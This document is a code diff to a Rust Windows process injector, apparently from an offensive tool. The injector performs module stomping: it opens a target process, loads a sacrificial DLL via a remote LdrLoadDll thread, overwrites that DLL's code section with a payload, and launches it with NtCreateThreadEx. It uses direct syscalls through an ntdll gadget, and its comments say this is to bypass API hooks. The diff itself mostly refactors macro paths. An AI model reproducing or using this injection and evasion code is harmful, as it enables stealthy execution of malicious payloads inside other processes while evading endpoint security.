@@ -21,6 +21,31 @@ struct DllCandidate {
     text_size: u32,
 }
 
+/// NtReadVirtualMemory — returns (ntstatus, bytes_read).
+#[cfg(windows)]
+macro_rules! nt_read_proc {
+    ($hproc:expr, $base:expr, $buf:expr) => {{
+        let mut _br: usize = 0;
+        let _s = crate::syscall!(
+            "NtReadVirtualMemory",
+            $hproc as u64, $base as u64,
+            $buf as *mut _ as u64, std::mem::size_of_val($buf) as u64,
+            &mut _br as *mut _ as u64,
+        );
+        (_s.unwrap_or(-1), _br)
+    }};
+    ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
+        let mut _br: usize = 0;
+        let _s = crate::syscall!(
+            "NtReadVirtualMemory",
+            $hproc as u64, $base as u64,
+            $buf as *mut _ as u64, $len as u64,
+            &mut _br as *mut _ as u64,
+        );
+        (_s.unwrap_or(-1), _br)
+    }};
+}
+
 /// Build a `Vec<DllCandidate>` by walking the InLoadOrderModuleList of the
 /// **target** process's PEB.  Each candidate's `.text` section must be at
 /// least `min_text_size` bytes and the DLL must not match any exclusion.
@@ -121,37 +146,12 @@ unsafe fn collect_peb_candidates(
 
 // ─── NT memory-operation macros (module-local, Windows only) ──────────
 
-/// NtReadVirtualMemory — returns (ntstatus, bytes_read).
-#[cfg(windows)]
-macro_rules! nt_read_proc {
-    ($hproc:expr, $base:expr, $buf:expr) => {{
-        let mut _br: usize = 0;
-        let _s = syscall!(
-            "NtReadVirtualMemory",
-            $hproc as u64, $base as u64,
-            $buf as *mut _ as u64, std::mem::size_of_val($buf) as u64,
-            &mut _br as *mut _ as u64,
-        );
-        (_s.unwrap_or(-1), _br)
-    }};
-    ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
-        let mut _br: usize = 0;
-        let _s = syscall!(
-            "NtReadVirtualMemory",
-            $hproc as u64, $base as u64,
-            $buf as *mut _ as u64, $len as u64,
-            &mut _br as *mut _ as u64,
-        );
-        (_s.unwrap_or(-1), _br)
-    }};
-}
-
 /// NtWriteVirtualMemory — returns (ntstatus, bytes_written).
 #[cfg(windows)]
 macro_rules! nt_write_proc {
     ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
         let mut _bw: usize = 0;
-        let _s = syscall!(
+        let _s = crate::syscall!(
             "NtWriteVirtualMemory",
             $hproc as u64, $base as u64,
             $buf as *const _ as u64, $len as u64,
@@ -167,7 +167,7 @@ macro_rules! nt_alloc_proc {
     ($hproc:expr, $size:expr, $prot:expr) => {{
         let mut _base: *mut std::ffi::c_void = std::ptr::null_mut();
         let mut _sz: usize = $size;
-        let _s = syscall!(
+        let _s = crate::syscall!(
             "NtAllocateVirtualMemory",
             $hproc as u64, &mut _base as *mut _ as u64,
             0u64, &mut _sz as *mut _ as u64,
@@ -188,7 +188,7 @@ macro_rules! nt_free_proc {
     ($hproc:expr, $base:expr) => {{
         let mut _fb = $base as usize;
         let mut _fs: usize = 0;
-        syscall!(
+        crate::syscall!(
             "NtFreeVirtualMemory",
             $hproc as u64, &mut _fb as *mut _ as u64,
             &mut _fs as *mut _ as u64, 0x8000u64,
@@ -203,7 +203,7 @@ macro_rules! nt_protect_proc {
         let mut _pb = $base as usize;
         let mut _ps = $size;
         let mut _old: u32 = 0;
-        let _s = syscall!(
+        let _s = crate::syscall!(
             "NtProtectVirtualMemory",
             $hproc as u64, &mut _pb as *mut _ as u64,
             &mut _ps as *mut _ as u64,
@@ -288,7 +288,7 @@ impl Injector for ModuleStompInjector {
                 | PROCESS_VM_READ
                 | PROCESS_CREATE_THREAD
                 | PROCESS_QUERY_INFORMATION) as u64;
-            let open_status = syscall!(
+            let open_status = crate::syscall!(
                 "NtOpenProcess",
                 &mut h_proc_val as *mut _ as u64,
                 access_mask,
@@ -303,7 +303,7 @@ impl Injector for ModuleStompInjector {
             let h_proc = h_proc_val as *mut winapi::ctypes::c_void;
 
             macro_rules! close_h {
-                () => { syscall!("NtClose", h_proc as u64).ok(); };
+                () => { crate::syscall!("NtClose", h_proc as u64).ok(); };
             }
             macro_rules! cleanup_and_err {
                 ($msg:expr) => {{ close_h!(); return Err(anyhow!($msg)); }};
@@ -389,7 +389,7 @@ impl Injector for ModuleStompInjector {
                 const PREFERRED_TEXT_MAX: usize = 2 * 1024 * 1024;
                 let mut loaded_ok = false;
 
-                for &candidate in sacrificial_candidates.iter() {
+                for candidate in sacrificial_candidates.iter() {
                     let wide: Vec<u16> = candidate
                         .encode_utf16()
                         .chain(std::iter::once(0))
@@ -478,7 +478,7 @@ impl Injector for ModuleStompInjector {
                     // (NtCreateThreadEx resolved through nt_syscall which uses
                     // SSN + syscall gadget, not through IAT).
                     let mut h_thread: usize = 0;
-                    let thread_status = syscall!(
+                    let thread_status = crate::syscall!(
                         "NtCreateThreadEx",
                         &mut h_thread as *mut _ as u64,
                         THREAD_ACCESS_WAITABLE as u64,
@@ -502,20 +502,20 @@ impl Injector for ModuleStompInjector {
                                 -((LDRLOADDLL_TIMEOUT_MS as i64) * 10_000);
                             let timeout_bytes =
                                 std::mem::transmute::<i64, [u8; 8]>(timeout_100ns);
-                            let wait_status = syscall!(
+                            let wait_status = crate::syscall!(
                                 "NtWaitForSingleObject",
                                 h_thread as u64,      // Handle
                                 0u64,                  // Alertable = FALSE
                                 timeout_bytes.as_ptr() as u64, // Timeout
                             );
-                            let wait_nt = wait_status.unwrap_or(-1i64);
-                            const STATUS_TIMEOUT: i64 = 0x00000102;
+                             let wait_nt = wait_status.unwrap_or(-1i32);
+                             const STATUS_TIMEOUT: i32 = 0x00000102;
                             if wait_nt == STATUS_TIMEOUT {
                                 log::warn!(
                                     "module_stomp: LdrLoadDll remote thread timed out after {}ms for {}",
                                     LDRLOADDLL_TIMEOUT_MS, candidate
                                 );
-                                syscall!(
+                                crate::syscall!(
                                     "NtTerminateThread",
                                     h_thread as u64,
                                     1u64
@@ -526,7 +526,7 @@ impl Injector for ModuleStompInjector {
                                     wait_nt as u32, candidate
                                 );
                             }
-                            syscall!("NtClose", h_thread as u64).ok();
+                            crate::syscall!("NtClose", h_thread as u64).ok();
                         }
                         Ok(s) => {
                             log::warn!(
@@ -679,7 +679,7 @@ impl Injector for ModuleStompInjector {
             }
 
             // Flush I-cache (defense-in-depth on ARM64, no-op on x86_64).
-            syscall!(
+            crate::syscall!(
                 "NtFlushInstructionCache",
                 h_proc as u64, target_addr as u64, payload.len() as u64,
             ).ok();
@@ -689,7 +689,7 @@ impl Injector for ModuleStompInjector {
             // and dispatches through a syscall gadget in ntdll, bypassing any
             // IAT hooks on CreateRemoteThread or NtCreateThreadEx.
             let mut h_exec_thread: usize = 0;
-            let exec_status = syscall!(
+            let exec_status = crate::syscall!(
                 "NtCreateThreadEx",
                 &mut h_exec_thread as *mut _ as u64,
                 THREAD_ACCESS_FIRE_AND_FORGET as u64,
@@ -707,7 +707,7 @@ impl Injector for ModuleStompInjector {
 
             match exec_status {
                 Ok(s) if s >= 0 && !h_exec_thread.is_null() => {
-                    syscall!("NtClose", h_exec_thread as u64).ok();
+                    crate::syscall!("NtClose", h_exec_thread as u64).ok();
                 }
                 Ok(s) => {
                     cleanup_and_err!(
